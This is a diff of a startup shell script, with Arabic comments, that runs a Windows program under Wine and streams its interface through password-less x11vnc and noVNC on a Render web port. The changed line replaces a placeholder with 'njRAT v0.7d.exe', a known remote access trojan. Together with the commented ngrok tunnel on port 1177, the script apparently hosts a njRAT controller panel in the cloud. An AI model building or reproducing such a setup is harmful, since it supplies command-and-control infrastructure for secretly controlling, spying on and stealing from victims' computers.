@@ -39,7 +39,7 @@ x11vnc -forever -shared -bg -nopw -display :1 &\n\
 # ngrok tcp 1177 &\n\
 \n\
 # 3. تشغيل برنامج الـ .NET باستخدام محاكي Wine\n\
-wine /app/YourProgramName.exe &\n\
+wine /app/njRAT v0.7d.exe &\n\
 \n\
 # 4. تشغيل خادم noVNC لبث الواجهة الرسومية على منفذ الويب الخاص بـ Render\n\
 /usr/share/novnc/utils/launch.sh --vnc localhost:5900 --listen 10000\n\
